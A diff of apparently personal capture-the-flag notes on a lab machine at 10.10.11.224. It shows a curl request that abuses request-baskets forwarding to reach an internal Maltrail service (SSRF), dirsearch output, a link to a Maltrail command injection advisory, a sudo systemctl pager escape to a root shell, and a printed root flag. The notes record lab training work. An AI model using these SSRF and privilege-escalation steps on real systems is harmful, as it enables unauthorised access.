@@ -28,7 +28,6 @@ Gr)*|) rot47 vCXYMX
 └─$ curl --location 'http://10.10.11.224:55555/api/baskets/witty123' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
 {"token":"mtXmQpPfEhMJirs8V6OYNue6EZVUSYKENwY_Lk8kDRGm"} 
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ dirsearch -u http://10.10.11.224:55555/k07l70v/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt
 
@@ -52,7 +51,6 @@ Target: http://10.10.11.224:55555/k07l70v/
 [13:01:42] 200 -    7KB - /k07l70v/logout
 [13:01:48] 200 -    4B  - /k07l70v/ping
 [13:01:55] 200 -   26B  - /k07l70v/robots.txt
-
 
 [Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrail (huntr.dev)](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)
 
@@ -100,10 +98,8 @@ User puma may run the following commands on sau:
 
 This invokes the default pager, which is likely to be [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply.
 
-
 sudo systemctl
 !sh
-
 
 puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
 sudo /usr/bin/systemctl status trail.service
@@ -123,6 +119,5 @@ cat root.txt
 27b757604d8fed39625a97e457f8b2d3
 
 ```
-![[Pasted image 20230721121754.png]]
 
 [[Weasel]]
